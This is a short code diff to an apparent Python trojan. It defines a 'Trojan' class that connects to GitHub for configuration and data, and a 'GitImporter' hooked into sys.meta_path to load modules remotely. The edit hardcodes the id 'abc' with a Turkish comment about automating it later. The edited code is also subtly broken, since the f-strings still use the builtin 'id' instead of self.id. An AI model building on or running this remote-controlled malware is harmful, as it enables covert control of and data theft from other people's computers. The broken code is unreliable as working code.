@@ -42,7 +42,7 @@ class GitImporter():
 
 class Trojan:
     def __init__(self):
-        self.id = id
+        self.id = 'abc' # birden fazla kullanılcagı zaman automate edilebilir
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
@@ -78,6 +78,6 @@ class Trojan:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    trojan = Trojan('abc')
+    trojan = Trojan()
     trojan.run()
 
